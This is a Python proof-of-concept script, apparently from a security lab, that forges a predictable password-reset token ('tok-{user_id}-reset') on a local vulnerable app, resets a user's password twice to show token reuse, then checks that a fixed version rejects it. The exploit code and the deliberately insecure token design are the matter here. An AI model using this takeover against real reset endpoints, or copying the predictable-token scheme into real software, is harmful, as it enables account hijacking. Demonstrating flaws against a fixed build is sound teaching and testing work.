"""
PoC 5.6 - Predictable and reusable password-reset token
========================================================
v1 generates the token as 'tok-{user_id}-reset' - directly derived from the
user id, has no expiry, and can be used multiple times.
v2 uses secrets.token_urlsafe(32), expires in 15 minutes, and is deleted
after the first use.

Requirements: v1 on http://127.0.0.1:5000, v2 on http://127.0.0.1:5001
Note: at least one user must be registered on v1 before running.
"""

import requests
import re

V1 = "http://127.0.0.1:5000"
V2 = "http://127.0.0.1:5001"
TARGET_USER_ID = 1
NEW_PASSWORD_V1 = "hacked123"


def build_v1_token(user_id: int) -> str:
    return f"tok-{user_id}-reset"


def reset_password(base, token, new_password):
    r = requests.post(
        f"{base}/reset-password",
        data={"token": token, "password": new_password},
    )
    return r.status_code, r.text


def get_v2_token(email):
    """Request a reset link from v2 and extract the token from the response."""
    r = requests.post(f"{V2}/forgot-password", data={"email": email})
    match = re.search(r'token=([\w\-]+)', r.text)
    return match.group(1) if match else None


def separator(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)


def main():
    # ── v1: attack ──────────────────────────────────────────────
    separator("v1-vulnerable - attack")

    token = build_v1_token(TARGET_USER_ID)
    print(f"[*] Constructed token for user id={TARGET_USER_ID}: {token!r}")

    print("[*] First reset attempt...")
    s1, b1 = reset_password(V1, token, NEW_PASSWORD_V1)
    print(f"    HTTP {s1}")
    if s1 == 200 and "Password updated" in b1:
        print("    [!] Password changed without owning the account.")

    print()
    print("[*] Second reset with the same token (reuse test)...")
    s2, b2 = reset_password(V1, token, NEW_PASSWORD_V1 + "2")
    print(f"    HTTP {s2}")
    if s2 == 200:
        print("    [!] Token reused successfully - no invalidation on v1.")
    else:
        print("    Token rejected on second use.")

    # ── v2: re-test ──────────────────────────────────────────────
    separator("v2-secure - re-test")

    print("[*] Trying the same predictable token format against v2...")
    s3, b3 = reset_password(V2, token, "Hacked@99")
    print(f"    HTTP {s3}")
    if s3 == 400:
        print("    [+] Predictable token rejected by v2.")
    else:
        print(f"    Unexpected response ({s3}).")


if __name__ == "__main__":
    main()
